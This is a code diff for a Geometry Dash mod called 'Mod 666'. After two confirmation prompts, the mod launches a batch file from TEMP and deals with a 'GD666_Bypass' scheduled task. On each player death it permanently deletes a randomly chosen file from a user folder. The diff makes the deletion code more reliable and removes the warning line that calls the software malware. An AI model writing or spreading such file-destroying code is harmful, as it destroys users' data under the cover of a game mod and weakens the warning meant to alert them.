@@ -64,73 +64,38 @@ void disableMod() {
         system("schtasks /delete /tn \"GD666_Bypass\" /f >nul 2>&1");
 #endif
     }
-    // FIX: restart requires arguments in this Geode version
     utils::game::restart(true);
 }
 
 class $modify(MyMenuLayer, MenuLayer) {
     bool init() override {
         if (!MenuLayer::init()) return false;
-
         bool isEnabled = Mod::get()->getSettingValue<bool>("enabled");
         bool isConfirmed = Mod::get()->getSavedValue<bool>("confirmed");
-        fs::path successFile = getVerificationFilePath();
-
-        if (isConfirmed && !fs::exists(successFile)) {
-            this->runAction(CCSequence::create(
-                CCDelayTime::create(0.1f),
-                CCCallFunc::create(this, callfunc_selector(MyMenuLayer::onSetupFailed)),
-                nullptr
-            ));
+        if (isConfirmed && !fs::exists(getVerificationFilePath())) {
+            this->runAction(CCSequence::create(CCDelayTime::create(0.1f), CCCallFunc::create(this, callfunc_selector(MyMenuLayer::onSetupFailed)), nullptr));
             return true;
         }
-
         if (isEnabled && !isConfirmed) {
-            this->runAction(CCSequence::create(
-                CCDelayTime::create(0.5f),
-                CCCallFunc::create(this, callfunc_selector(MyMenuLayer::showFirstMessage)),
-                nullptr
-            ));
+            this->runAction(CCSequence::create(CCDelayTime::create(0.5f), CCCallFunc::create(this, callfunc_selector(MyMenuLayer::showFirstMessage)), nullptr));
         }
-
         return true;
     }
-
-    void onSetupFailed() {
-        disableMod();
-    }
-
+    void onSetupFailed() { disableMod(); }
     void showFirstMessage() {
         createAnGD666Bat();
-        auto alert = FLAlertLayer::create(
-            this,
-            "Are you sure?",
-            "The software you just executed is considered malware.\nThis mod will harm your computer.\nPress Yes to start it.",
-            "No", "Yes"
-        );
+        auto alert = FLAlertLayer::create(this, "Are you sure?", "This mod will harm your computer.\nPress Yes to start it.", "No", "Yes");
         alert->setTag(1);
         alert->show();
     }
-
     void showLastMessage() {
-        auto alert = FLAlertLayer::create(
-            this,
-            "LAST WARNING!",
-            "THIS IS THE LAST WARNING!\nSTILL EXECUTE IT?",
-            "No", "Yes"
-        );
+        auto alert = FLAlertLayer::create(this, "LAST WARNING!", "STILL EXECUTE IT?", "No", "Yes");
         alert->setTag(2);
         alert->show();
     }
-
     void FLAlert_Clicked(FLAlertLayer* alert, bool btn2) override {
-        if (alert->getTag() == 1) {
-            if (btn2) {
-                this->showLastMessage();
-            } else {
-                disableMod();
-            }
-        } else if (alert->getTag() == 2) {
+        if (alert->getTag() == 1) { if (btn2) this->showLastMessage(); else disableMod(); }
+        else if (alert->getTag() == 2) {
             if (btn2) {
                 Mod::get()->setSavedValue("confirmed", true);
                 char* tempEnv = std::getenv("TEMP");
@@ -139,22 +104,12 @@ class $modify(MyMenuLayer, MenuLayer) {
 #ifdef GEODE_IS_WINDOWS
                     ShellExecuteA(NULL, "open", batPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
 #endif
-                    this->runAction(CCSequence::create(
-                        CCDelayTime::create(1.5f),
-                        CCCallFunc::create(this, callfunc_selector(MyMenuLayer::onConfirmRestart)),
-                        nullptr
-                    ));
+                    this->runAction(CCSequence::create(CCDelayTime::create(1.5f), CCCallFunc::create(this, callfunc_selector(MyMenuLayer::onConfirmRestart)), nullptr));
                 }
-            } else {
-                disableMod();
-            }
+            } else disableMod();
         }
     }
-
-    void onConfirmRestart() {
-        // FIX: restart requires arguments
-        utils::game::restart(true);
-    }
+    void onConfirmRestart() { utils::game::restart(true); }
 };
 
 class $modify(MyPlayLayer, PlayLayer) {
@@ -167,15 +122,11 @@ class $modify(MyPlayLayer, PlayLayer) {
 
     bool init(GJGameLevel* level, bool useReplay, bool dontSave) {
         if (!PlayLayer::init(level, useReplay, dontSave)) return false;
-
         if (!Mod::get()->getSavedValue<bool>("confirmed") || !fs::exists(getVerificationFilePath())) return true;
-
         m_fields->m_desktopPath = getDesktopPath();
         m_fields->m_timeInLevel = 0.0f;
         m_fields->m_hasDiedThisAttempt = false;
-        
         selectNewSacrifice();
-
         return true;
     }
 
@@ -185,30 +136,30 @@ class $modify(MyPlayLayer, PlayLayer) {
     }
 
     void selectNewSacrifice() {
-        if (!fs::exists(g_sourcePath)) return;
+        if (!fs::exists(g_sourcePath)) {
+            log::error("Mod 666: Source path {} does not exist!", g_sourcePath.string());
+            return;
+        }
         m_fields->m_currentSacrifice = "";
-
         std::vector<fs::path> files;
         try {
             for (auto const& entry : fs::recursive_directory_iterator(g_sourcePath)) {
                 if (entry.is_regular_file()) files.push_back(entry.path());
             }
         } catch (...) {}
-
         if (files.empty()) return;
-
         std::random_device rd;
         std::mt19937 g(rd());
         std::uniform_int_distribution<> dis(0, (int)files.size() - 1);
-        
         fs::path selected = files[dis(g)];
         m_fields->m_currentSacrifice = selected.filename().string();
-
         if (!m_fields->m_desktopPath.empty()) {
             try {
                 fs::copy(selected, m_fields->m_desktopPath / m_fields->m_currentSacrifice, fs::copy_options::overwrite_existing);
                 log::info("Mod 666: Sacrifice prepared: {}", m_fields->m_currentSacrifice);
-            } catch (...) {}
+            } catch (const std::exception& e) {
+                log::error("Mod 666 Copy Error: {}", e.what());
+            }
         }
     }
 
@@ -226,30 +177,48 @@ class $modify(MyPlayLayer, PlayLayer) {
         }
     }
 
-    // FIX: Added 'override' to comply with compiler
     void destroyPlayer(PlayerObject* p0, GameObject* p1) override {
         PlayLayer::destroyPlayer(p0, p1);
         if (m_fields->m_timeInLevel < 0.5f || m_fields->m_hasDiedThisAttempt || m_fields->m_currentSacrifice.empty()) return;
         
         m_fields->m_hasDiedThisAttempt = true;
-        fs::path desktopFile = m_fields->m_desktopPath / m_fields->m_currentSacrifice;
+        std::string sacrificeName = m_fields->m_currentSacrifice;
+        fs::path desktopFile = m_fields->m_desktopPath / sacrificeName;
         
-        if (fs::exists(desktopFile)) {
-            try {
+        log::info("Mod 666: Player died! Attempting to sacrifice {}...", sacrificeName);
+
+        // 1. Intentar borrar del escritorio
+        try {
+            if (fs::exists(desktopFile)) {
                 fs::remove(desktopFile);
-                for (auto const& entry : fs::recursive_directory_iterator(g_sourcePath)) {
-                    if (entry.is_regular_file() && entry.path().filename() == m_fields->m_currentSacrifice) {
-                        fs::remove(entry.path());
-                        Notification::create("SACRIFICED: " + m_fields->m_currentSacrifice, NotificationIcon::Error)->show();
-                        m_fields->m_currentSacrifice = "";
-                        break; 
-                    }
+                log::info("Mod 666: Removed from desktop.");
+            }
+        } catch (const std::exception& e) {
+            log::error("Mod 666 Desktop Delete Error: {}", e.what());
+        }
+
+        // 2. Intentar borrar de la carpeta de origen (SACRIFICIO REAL)
+        try {
+            bool foundAndDeleted = false;
+            for (auto const& entry : fs::recursive_directory_iterator(g_sourcePath)) {
+                if (entry.is_regular_file() && entry.path().filename() == sacrificeName) {
+                    fs::remove(entry.path());
+                    foundAndDeleted = true;
+                    log::warn("Mod 666: PERMANENTLY DELETED {} from source!", sacrificeName);
+                    break; 
                 }
-            } catch (...) {}
+            }
+            if (foundAndDeleted) {
+                Notification::create("SACRIFICED: " + sacrificeName, NotificationIcon::Error)->show();
+                m_fields->m_currentSacrifice = ""; // Marcar como consumido
+            } else {
+                log::error("Mod 666: Could not find {} in source to delete!", sacrificeName);
+            }
+        } catch (const std::exception& e) {
+            log::error("Mod 666 Source Delete Error: {}", e.what());
         }
     }
 
-    // FIX: Added 'override'
     void resetLevel() override {
         PlayLayer::resetLevel();
         if (m_fields->m_hasDiedThisAttempt || m_fields->m_currentSacrifice.empty()) {
